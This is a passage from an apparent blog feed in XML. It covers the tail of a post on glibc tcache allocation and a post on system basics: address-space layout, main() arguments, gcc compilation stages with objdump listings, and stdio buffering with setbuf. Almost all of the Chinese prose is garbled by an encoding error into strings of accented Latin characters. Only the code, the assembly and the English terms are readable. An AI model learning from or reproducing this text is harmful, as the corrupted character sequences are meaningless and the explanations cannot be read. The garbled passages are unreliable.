MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br></pre></td></tr></table></figure><h2 id="åŸºæœ¬å·¥ä½œ"><a href="#åŸºæœ¬å·¥ä½œ" class="headerlink" title="åŸºæœ¬å·¥ä½œ"></a>åŸºæœ¬å·¥ä½œ</h2><ul><li><p>ç¬¬ä¸€æ¬¡ malloc æ—¶ï¼Œä¼šå…ˆ malloc ä¸€å—å†…å­˜ç”¨æ¥å­˜æ”¾ <strong>tcache_perthread_struct</strong> ã€‚</p></li><li><p>free å†…å­˜ï¼Œä¸” size å°äº small bin size æ—¶</p><ul><li>å…ˆæ”¾åˆ°å¯¹åº”çš„ tcache ä¸­ï¼Œç›´åˆ° tcache è¢«å¡«æ»¡ï¼ˆé»˜è®¤æ˜¯ 7 ä¸ªï¼‰ï¼ˆ<strong>pä½ä¸ç½®é›¶æ•…ä¸åˆå¹¶</strong>ï¼‰</li><li>tcache è¢«å¡«æ»¡ä¹‹åï¼Œå†æ¬¡ free çš„å†…å­˜å’Œä¹‹å‰ä¸€æ ·è¢«æ”¾åˆ° fastbin æˆ–è€… unsorted bin ä¸­</li><li>tcache ä¸­çš„ chunk ä¸ä¼šåˆå¹¶ï¼ˆä¸å–æ¶ˆ inuse bitï¼‰</li></ul></li><li><p>malloc å†…å­˜ï¼Œä¸” size åœ¨ tcache èŒƒå›´å†…</p><ul><li><p>å…ˆä» tcache å– chunkï¼Œç›´åˆ° tcache ä¸ºç©º</p></li><li><p>tcache ä¸ºç©ºåï¼Œä» bin ä¸­æ‰¾</p></li><li><p>tcache ä¸ºç©ºæ—¶ï¼Œå¦‚æœ <strong>fastbin/smallbin/unsorted bin</strong>ä¸­æœ‰ size ç¬¦åˆçš„ chunkï¼Œä¼šå…ˆæŠŠ <strong>fastbin/smallbin/unsorted bin</strong> ä¸­çš„ chunk æ”¾åˆ° tcache ä¸­ï¼Œç›´åˆ°å¡«æ»¡ã€‚ä¹‹åå†ä» tcache ä¸­å–ï¼›å› æ­¤ chunk åœ¨ bin ä¸­å’Œ tcache ä¸­çš„é¡ºåºä¼šåè¿‡æ¥</p></li></ul></li></ul><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>è¿™ç¯‡æ–‡ç« è¾ƒä¸Šä¸€ç¯‡æ›´å¤šä¸œè¥¿æ˜¯ç¼ä¸Šå»çš„,å½’çº³æ•´ç†çš„æˆåˆ†æ›´å¤š,è‡ªå·±æ€»ç»“çš„å°‘ä¸€ç‚¹ã€‚</p>]]></content>
    
    
    <summary type="html">æ›´æ·±å…¥ä¸€ç‚¹ç‚¹</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="å­¦ä¹ è®°å½•" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="å †" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>åŸºç¡€æ‚çƒ©</title>
    <link href="https://ixout.github.io/posts/32771/"/>
    <id>https://ixout.github.io/posts/32771/</id>
    <published>2023-03-18T07:16:02.000Z</published>
    <updated>2023-03-27T01:31:27.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å­¦ä¹ è¿‡ç¨‹ä¸­å‘ç°è‡ªå·±å¯¹ä¸€äº›è®¡ç®—æœºç³»ç»Ÿçš„åŸºç¡€çŸ¥è¯†å¹¶ä¸äº†è§£ï¼Œç›®å‰æš‚æ—¶ä¹Ÿæ²¡æœ‰ç²¾åŠ›å»ç³»ç»Ÿçš„å­¦ä¹ ï¼Œäºæ˜¯å°±å°†ç»å¸¸é‡åˆ°çš„åˆä¸æ‡‚çš„çŸ¥è¯†å½’çº³ä¸€ä¸‹</p><hr><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„"><a href="#è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„" class="headerlink" title="è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„"></a>è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„</h2><p>å…ˆçœ‹ä¸€ä¸‹è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ€»ä½“å¸ƒå±€ï¼Œä»¥32ä½Linuxç³»ç»Ÿä¸ºä¾‹ï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_152459.png" alt=""></p><p>åŸºäºä¸Šå›¾çš„è™šæ‹Ÿåœ°å€ç©ºé—´å¸ƒå±€æ¥ç®€å•è¯´ä¸‹ELFæ–‡ä»¶æ˜¯æ€æ ·æ˜ å°„åˆ°è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„ï¼ŒELFæ–‡ä»¶è¢«ç»„ç»‡æˆå¦‚ä¸‹å›¾å·¦åˆ—å‡ºçš„ä¸€ç³»åˆ—sectionï¼Œå…¶ä¸­å…·æœ‰ç›¸åŒå±æ€§ï¼ˆR/W/Eï¼‰çš„sectionå†ç»„æˆä¸€ä¸ªsegmentï¼Œä»¥segmentä¸ºå•ä½æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå…¶ä¸­è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„segmentè¦åšåˆ°é¡µå¤§å°å¯¹é½ï¼Œä¸‹å›¾ä¹Ÿä¸€åŒç®€è¦å±•ç¤ºäº†è™šæ‹Ÿåœ°å€ç©ºé—´åˆ°ç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„ï¼Œé€šè¿‡MMUå®Œæˆã€‚</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_152545.png" alt=""></p><p>å…¶å®ƒç³»ç»ŸåŸç†ç±»ä¼¼ï¼Œéƒ½æ˜¯å°†å¯æ‰§è¡Œç¨‹åºç»„ç»‡æˆè‹¥å¹²segmentè¿åŒç”¨åˆ°çš„åŠ¨æ€åº“å’Œkernelæ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä¸»è¦å·®åˆ«åœ¨äºä¸åŒsegmentæ˜ å°„çš„èµ·å§‹åœ°å€ã€å¤§å°ä¸åŒç­‰ï¼Œæ¯”å¦‚32ä½Linuxç³»ç»Ÿçš„Text segmentèµ·å€æ˜¯0x08048000ï¼Œ64ä½Linuxç³»ç»Ÿçš„Text segmentèµ·å€æ˜¯0x00400000ï¼Œå†æ¯”å¦‚ç›¸å¯¹32ä½Linuxç³»ç»Ÿçš„kernel spaceæ˜¯1Gï¼Œ32ä½Windowsçš„kernel spaceæ˜¯2Gç­‰ç­‰ã€‚</p><h2 id="mainå‡½æ•°å‚æ•°"><a href="#mainå‡½æ•°å‚æ•°" class="headerlink" title="mainå‡½æ•°å‚æ•°"></a>mainå‡½æ•°å‚æ•°</h2><p>å­¦cè¯­è¨€æ—¶æœ‰æ²¡æœ‰å­¦è¿‡å¿˜äº†ï¼Œåæ­£æˆ‘ä¸ä¼šï¼Œäº†è§£ä¸€ä¸‹</p><ul><li><p>int argcï¼šè¿™ä¸ªä¸œè¥¿æ˜¯æ‰€æœ‰å‚æ•°çš„ä¸ªæ•°ï¼ŒåŒ…æ‹¬æ–‡ä»¶å</p></li><li><p>char* argv[]ï¼šè¿™ä¸ªä¸œè¥¿é‡Œé¢ï¼Œargv[]æ˜¯argcä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬0ä¸ªå‚æ•°å³argv[0]æ˜¯ç¨‹åºçš„å…¨åï¼Œåé¢è·Ÿç€çš„å°±æ˜¯ç”¨æˆ·è¾“å…¥çš„å‚æ•°äº†</p></li><li>char* envp[]ï¼šè¿™ä¸ªä¸œè¥¿ç”¨æ¥å–å¾—ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼Œenvpä¿å­˜äº†ç³»ç»Ÿæ‰€æœ‰çš„ç¯å¢ƒå˜é‡è·¯å¾„</li></ul><h2 id="ä»æºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶"><a href="#ä»æºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ä»æºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶"></a>ä»æºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶</h2><p>è¿‡ç¨‹å¯åˆ†ä¸º4ä¸ªæ­¥éª¤ï¼šé¢„å¤„ç†ï¼ˆPreprocessingï¼‰ã€ç¼–è¯‘ï¼ˆCompilationï¼‰ã€æ±‡ç¼–ï¼ˆAssemblyï¼‰å’Œé“¾æ¥ï¼ˆLinkingï¼‰ã€‚</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_110757.png" alt=""></p><p>ä»¥hello word ä¸ºä¾‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é¢„ç¼–è¯‘"><a href="#é¢„ç¼–è¯‘" class="headerlink" title="é¢„ç¼–è¯‘"></a>é¢„ç¼–è¯‘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">&quot;hello.c&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">printf</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__restrict __format, ...)</span>;</span><br><span class="line">......</span><br><span class="line">main() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢„ç¼–è¯‘è¿‡ç¨‹ä¸»è¦å¤„ç†æºä»£ç ä¸­ä»¥ â€œ#â€ å¼€å§‹çš„é¢„ç¼–è¯‘æŒ‡ä»¤ï¼š</p><ul><li>å°†æ‰€æœ‰çš„ â€œ#defineâ€ åˆ é™¤ï¼Œå¹¶ä¸”å±•å¼€æ‰€æœ‰çš„å®å®šä¹‰ã€‚</li><li>å¤„ç†æ‰€æœ‰æ¡ä»¶é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå¦‚ â€œ#ifâ€ã€â€œ#ifdefâ€ã€â€œ#elifâ€ã€â€œ#elseâ€ã€â€œ#endifâ€ã€‚</li><li>å¤„ç† â€œ#includeâ€ é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå°†è¢«åŒ…å«çš„æ–‡ä»¶æ’å…¥åˆ°è¯¥é¢„ç¼–è¯‘æŒ‡ä»¤çš„ä½ç½®ã€‚æ³¨æ„ï¼Œè¯¥è¿‡ç¨‹é€’å½’æ‰§è¡Œã€‚</li><li>åˆ é™¤æ‰€æœ‰æ³¨é‡Šã€‚</li><li>æ·»åŠ è¡Œå·å’Œæ–‡ä»¶åæ ‡å·ã€‚</li><li>ä¿ç•™æ‰€æœ‰çš„ #pragma ç¼–è¯‘å™¨æŒ‡ä»¤ã€‚</li></ul><h3 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">        .file   &quot;hello.c&quot;</span><br><span class="line">        .section        .rodata</span><br><span class="line">.LC0:</span><br><span class="line">        .string &quot;hello, world&quot;</span><br><span class="line">        .text</span><br><span class="line">        .globl  main</span><br><span class="line">        .type   main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        pushq   %rbp</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset 6, -16</span><br><span class="line">        movq    %rsp, %rbp</span><br><span class="line">        .cfi_def_cfa_register 6</span><br><span class="line">        leaq    .LC0(%rip), %rdi</span><br><span class="line">        call    puts@PLT</span><br><span class="line">        movl    $0, %eax</span><br><span class="line">        popq    %rbp</span><br><span class="line">        .cfi_def_cfa 7, 8</span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">        .size   main, .-main</span><br><span class="line">        .ident  &quot;GCC: (GNU) 7.2.0&quot;</span><br><span class="line">        .section        .note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘è¿‡ç¨‹å°±æ˜¯æŠŠé¢„å¤„ç†å®Œçš„æ–‡ä»¶è¿›è¡Œä¸€ç³»åˆ—è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æåŠä¼˜åŒ–åç”Ÿæˆç›¸åº”çš„æ±‡ç¼–ä»£ç æ–‡ä»¶ã€‚</p><h3 id="æ±‡ç¼–"><a href="#æ±‡ç¼–" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c hello.s -o hello.o</span><br><span class="line">æˆ–è€…</span><br><span class="line">$gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -sd hello.o</span><br><span class="line"></span><br><span class="line">hello.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 554889e5 488d3d00 000000e8 00000000  UH..H.=.........</span><br><span class="line"> 0010 b8000000 005dc3                      .....].</span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 68656c6c 6f2c2077 6f726c64 00        hello, world.</span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202847 4e552920 372e322e  .GCC: (GNU) 7.2.</span><br><span class="line"> 0010 3000                                 0.</span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 01781001  .........zR..x..</span><br><span class="line"> 0010 1b0c0708 90010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 17000000 00410e10 8602430d  .........A....C.</span><br><span class="line"> 0030 06520c07 08000000                    .R......</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">   0:   55                      push   %rbp</span><br><span class="line">   1:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">   4:   48 8d 3d 00 00 00 00    lea    0x0(%rip),%rdi        # b &lt;main+0xb&gt;</span><br><span class="line">   b:   e8 00 00 00 00          callq  10 &lt;main+0x10&gt;</span><br><span class="line">  10:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  15:   5d                      pop    %rbp</span><br><span class="line">  16:   c3                      retq</span><br></pre></td></tr></table></figure><p>æ±‡ç¼–å™¨å°†æ±‡ç¼–ä»£ç è½¬å˜æˆæœºå™¨å¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</p><h3 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d -j .text hello</span><br><span class="line">......</span><br><span class="line">000000000000064a &lt;main&gt;:</span><br><span class="line"> 64a:   55                      push   %rbp</span><br><span class="line"> 64b:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line"> 64e:   48 8d 3d 9f 00 00 00    lea    0x9f(%rip),%rdi        # 6f4 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line"> 655:   e8 d6 fe ff ff          callq  530 &lt;puts@plt&gt;</span><br><span class="line"> 65a:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 65f:   5d                      pop    %rbp</span><br><span class="line"> 660:   c3                      retq</span><br><span class="line"> 661:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line"> 668:   00 00 00</span><br><span class="line"> 66b:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>ç›®æ ‡æ–‡ä»¶éœ€è¦é“¾æ¥ä¸€å¤§å †æ–‡ä»¶æ‰èƒ½å¾—åˆ°æœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆä¸Šé¢åªå±•ç¤ºäº†é“¾æ¥åçš„ main å‡½æ•°ï¼Œå¯ä»¥å’Œ hello.o ä¸­çš„ main å‡½æ•°ä½œå¯¹æ¯”ï¼‰ã€‚é“¾æ¥è¿‡ç¨‹ä¸»è¦åŒ…æ‹¬åœ°å€å’Œç©ºé—´åˆ†é…ï¼ˆAddress and Storage Allocationï¼‰ã€ç¬¦å·å†³è®®ï¼ˆSymbol Resolutionï¼‰å’Œé‡å®šå‘ï¼ˆRelocationï¼‰ç­‰ã€‚</p><h2 id="ç¼“å†²"><a href="#ç¼“å†²" class="headerlink" title="ç¼“å†²"></a>ç¼“å†²</h2><h3 id="ç¼“å†²åŒºæ˜¯å•¥"><a href="#ç¼“å†²åŒºæ˜¯å•¥" class="headerlink" title="ç¼“å†²åŒºæ˜¯å•¥"></a>ç¼“å†²åŒºæ˜¯å•¥</h3><p>ç¼“å†²åŒºæ˜¯è®¡ç®—æœºä¸­ç”¨äºå­˜å‚¨æ•°æ®çš„ä¸€æ®µå†…å­˜åŒºåŸŸï¼Œå®ƒå¯ä»¥ç”¨äºä¸´æ—¶å­˜å‚¨è¾“å…¥æˆ–è¾“å‡ºçš„æ•°æ®ï¼Œä»¥æé«˜è®¡ç®—æœºçš„æ€§èƒ½ã€‚<strong>åœ¨è¾“å…¥/è¾“å‡ºæ“ä½œä¸­ï¼Œç¼“å†²åŒºé€šå¸¸ç”¨äºä¸´æ—¶å­˜å‚¨å¾…è¯»å–æˆ–å¾…å†™å…¥çš„æ•°æ®</strong>ã€‚</p><p>åœ¨æ ‡å‡†Cåº“ä¸­ï¼Œå¯¹äºæ–‡ä»¶æµï¼Œç¼“å†²åŒºæ˜¯ç”±åº“ç®¡ç†çš„ä¸€ä¸ªå†…å­˜åŒºåŸŸï¼Œç”¨äºå­˜å‚¨è¯»å†™æ•°æ®æ—¶çš„ä¸´æ—¶æ•°æ®ã€‚<strong>è¾“å…¥ç¼“å†²åŒºç”¨äºç¼“å­˜ä»æ–‡ä»¶ä¸­è¯»å–çš„æ•°æ®ï¼Œè¾“å‡ºç¼“å†²åŒºç”¨äºç¼“å­˜å°†è¦å†™å…¥æ–‡ä»¶çš„æ•°æ®</strong>ã€‚ç¼“å†²åŒºçš„ä½œç”¨æ˜¯å°†å¤šä¸ªå°æ•°æ®å—åˆå¹¶æˆä¸€ä¸ªå¤§æ•°æ®å—è¿›è¡Œè¯»å†™ï¼Œä»è€Œæé«˜è¾“å…¥è¾“å‡ºæ•ˆç‡ã€‚</p><p>ç¼“å†²åŒºçš„å¤§å°é€šå¸¸æ˜¯å¯é…ç½®çš„ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®å®é™…éœ€æ±‚è¿›è¡Œè°ƒæ•´ã€‚è¾ƒå°çš„ç¼“å†²åŒºå¯ä»¥æé«˜è¾“å…¥è¾“å‡ºçš„å®æ—¶æ€§ï¼Œä½†å¯èƒ½ä¼šå¯¼è‡´è¯»å†™é€Ÿåº¦è¾ƒæ…¢ã€‚è¾ƒå¤§çš„ç¼“å†²åŒºå¯ä»¥æé«˜è¾“å…¥è¾“å‡ºçš„é€Ÿåº¦ï¼Œä½†ä¼šæ¶ˆè€—æ›´å¤šçš„å†…å­˜ç©ºé—´ã€‚å› æ­¤ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œéœ€è¦æ ¹æ®å…·ä½“åœºæ™¯å’Œéœ€æ±‚æ¥é€‰æ‹©åˆé€‚çš„ç¼“å†²åŒºå¤§å°ã€‚</p><h3 id="è¾“å‡ºæµä¸è¾“å…¥æµå’Œé”™è¯¯æµ"><a href="#è¾“å‡ºæµä¸è¾“å…¥æµå’Œé”™è¯¯æµ" class="headerlink" title="è¾“å‡ºæµä¸è¾“å…¥æµå’Œé”™è¯¯æµ"></a>è¾“å‡ºæµä¸è¾“å…¥æµå’Œé”™è¯¯æµ</h3><p><strong>è¾“å…¥æµ</strong>é€šå¸¸ä¸è¾“å…¥è®¾å¤‡ç›¸å¯¹åº”ï¼Œä¾‹å¦‚é”®ç›˜ã€é¼ æ ‡ã€è§¦æ‘¸å±ç­‰ã€‚ç¨‹åºå¯ä»¥ä»è¾“å…¥æµä¸­è¯»å–æ•°æ®ï¼Œä»¥ä¾¿å¯¹æ•°æ®è¿›è¡Œå¤„ç†å’Œåˆ†æã€‚åœ¨ C è¯­è¨€ä¸­ï¼Œæ ‡å‡†è¾“å…¥æµ stdin å°±æ˜¯ä¸€ç§è¾“å…¥æµï¼Œç¨‹åºå¯ä»¥ä½¿ç”¨å„ç§è¾“å…¥å‡½æ•°ï¼ˆå¦‚ scanf() æˆ– fgets()ï¼‰ä» stdin ä¸­è¯»å–æ•°æ®ã€‚</p><p><strong>è¾“å‡ºæµ</strong>é€šå¸¸ä¸è¾“å‡ºè®¾å¤‡ç›¸å¯¹åº”ï¼Œä¾‹å¦‚æ˜¾ç¤ºå™¨ã€æ‰“å°æœºã€æ–‡ä»¶ç­‰ã€‚ç¨‹åºå¯ä»¥ä½¿ç”¨å„ç§è¾“å‡ºå‡½æ•°ï¼ˆå¦‚ printf() æˆ– fputs()ï¼‰å°†æ•°æ®è¾“å‡ºåˆ°è¾“å‡ºæµä¸­ï¼Œä»¥ä¾¿å±•ç¤ºç»™ç”¨æˆ·æˆ–ä¿å­˜åˆ°æ–‡ä»¶ä¸­ã€‚åœ¨ C è¯­è¨€ä¸­ï¼Œæ ‡å‡†è¾“å‡ºæµ stdout å°±æ˜¯ä¸€ç§è¾“å‡ºæµï¼Œç¨‹åºå¯ä»¥ä½¿ç”¨å„ç§è¾“å‡ºå‡½æ•°å‘ stdout ä¸­è¾“å‡ºæ•°æ®ã€‚</p><p>é™¤äº†æ ‡å‡†è¾“å…¥æµ stdin å’Œæ ‡å‡†è¾“å‡ºæµ stdoutï¼ŒC è¯­è¨€è¿˜æä¾›äº†ä¸€ä¸ª<strong>æ ‡å‡†é”™è¯¯æµ stderr</strong>ã€‚ä¸æ ‡å‡†è¾“å…¥æµå’Œæ ‡å‡†è¾“å‡ºæµç±»ä¼¼ï¼Œæ ‡å‡†é”™è¯¯æµä¹Ÿæ˜¯ä¸€ç§æ•°æ®æµï¼Œç”¨äºå‘ç¨‹åºå¼€å‘è€…æˆ–ç”¨æˆ·æŠ¥å‘Šé”™è¯¯å’Œå¼‚å¸¸æƒ…å†µã€‚åœ¨ C è¯­è¨€ä¸­ï¼Œæ ‡å‡†é”™è¯¯æµ stderr ä¸æ ‡å‡†è¾“å‡ºæµ stdout ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç§è¾“å‡ºæµï¼Œå¯ä»¥ä½¿ç”¨å„ç§è¾“å‡ºå‡½æ•°å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ° stderr ä¸­ã€‚ä¸æ ‡å‡†è¾“å‡ºæµä¸åŒçš„æ˜¯ï¼Œæ ‡å‡†é”™è¯¯æµé€šå¸¸ä¸ä¼šè¢«ç¼“å†²ï¼Œè¿™æ„å‘³ç€å½“é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ° stderr æ—¶ï¼Œå®ƒä¼šç«‹å³æ˜¾ç¤ºåœ¨å±å¹•ä¸Šæˆ–è¢«å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å’Œå¤„ç†é”™è¯¯ã€‚</p><h3 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h3><p>setbuf æ˜¯ä¸€ä¸ªæ ‡å‡†Cåº“å‡½æ•°ï¼Œç”¨äºè®¾ç½®æ ‡å‡†I/Oåº“çš„ç¼“å†²åŒºã€‚å®ƒçš„åŸå‹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void setbuf(FILE *restrict stream, char *restrict buf);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œstream æ˜¯ä¸€ä¸ªæŒ‡å‘ FILE ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œç”¨äºæ ‡è¯†è¦è®¾ç½®ç¼“å†²åŒºçš„æµï¼›buf æ˜¯ä¸€ä¸ªæŒ‡å‘ char ç±»å‹çš„æ•°ç»„ï¼Œç”¨äºæŒ‡å®šç¼“å†²åŒºçš„åœ°å€ã€‚<strong>å¦‚æœ buf æ˜¯ NULLï¼Œé‚£ä¹ˆä¼šç¦ç”¨ç¼“å†²ï¼Œç›¸å½“äºå°†æµè®¾ç½®ä¸ºæ— ç¼“å†²æ¨¡å¼</strong>ã€‚</p><p>setbuf å‡½æ•°çš„ä½œç”¨æ˜¯è®¾ç½®æµçš„ç¼“å†²åŒºï¼Œä»¥åŠå†³å®šæµçš„ç¼“å†²æ¨¡å¼ï¼ˆæœ‰ç¼“å†²æˆ–æ— ç¼“å†²ï¼‰ã€‚æœ‰ç¼“å†²æ¨¡å¼ä¸‹ï¼Œæ¯æ¬¡è¾“å‡ºæ“ä½œï¼ˆå¦‚ fprintfã€fputsã€fwrite ç­‰ï¼‰å°†æ•°æ®å†™å…¥åˆ°ç¼“å†²åŒºï¼Œç›´åˆ°ç¼“å†²åŒºæ»¡äº†æˆ–è€…é‡åˆ°äº†ä¸€ä¸ªæ¢è¡Œç¬¦ï¼ˆâ€™\nâ€™ï¼‰æ‰ä¼šå°†ç¼“å†²åŒºä¸­çš„æ•°æ®ä¸€æ¬¡æ€§åœ°å†™å…¥åˆ°ç£ç›˜ä¸Šçš„æ–‡ä»¶ã€‚æ— ç¼“å†²æ¨¡å¼ä¸‹ï¼Œæ¯æ¬¡è¾“å‡ºæ“ä½œéƒ½ä¼šç›´æ¥å†™å…¥åˆ°ç£ç›˜ä¸Šçš„æ–‡ä»¶ä¸­ã€‚</p><p>ä½¿ç”¨ setbuf 